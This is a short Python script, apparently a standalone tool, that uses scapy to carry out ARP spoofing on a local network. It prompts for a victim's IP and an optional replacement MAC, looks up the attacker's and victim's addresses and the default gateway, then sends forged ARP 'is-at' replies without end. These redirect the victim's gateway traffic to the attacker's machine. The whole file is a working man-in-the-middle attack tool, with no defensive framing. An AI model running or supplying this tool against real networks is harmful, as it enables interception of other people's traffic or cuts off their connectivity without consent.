from scapy.all import *
from subprocess import *
import socket
import netifaces as ni

def get_mac(ip):
	Popen(["ping", "-c 1", ip], stdout = PIPE)
	pid = Popen(["arp", "-n", ip], stdout = PIPE)
	s = pid.communicate()[0]
	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return mac

ip_victim = raw_input('Input IP address of a host within your local network: ')
mac_spoofed = raw_input('Input MAC of a new gateway for the victim, or leave blank to use MAC of your computer: ')

ni.ifaddresses('enp0s3')
ip_attacker = ni.ifaddresses('enp0s3')[ni.AF_INET][0]['addr']

my_macs = [get_if_hwaddr(i) for i in get_if_list()]
mac_attacker = my_macs[1]

mac_victim = get_mac(ip_victim)

gateway_ip = ni.gateways()['default'][ni.AF_INET][0]

if (mac_spoofed is ""):
	mac_spoofed = mac_attacker	

call(["clear"])

print("Attacker IP: " + ip_attacker + ", Attacker MAC: " + mac_attacker)
print("Victim IP: " + ip_victim + ", Victim MAC: " + mac_victim)
print ("Local gateway: " + gateway_ip)

pkt = Ether() / ARP()

pkt[Ether].src = mac_spoofed
pkt[ARP].hwsrc = mac_spoofed
pkt[ARP].psrc = gateway_ip
pkt[ARP].hwdst = mac_victim
pkt[ARP].pdst = ip_victim
pkt[ARP].op = 'is-at'

print("Spoofing, gateway for the victim is now: " + mac_spoofed)

while True:
	sendp(pkt, verbose=False)
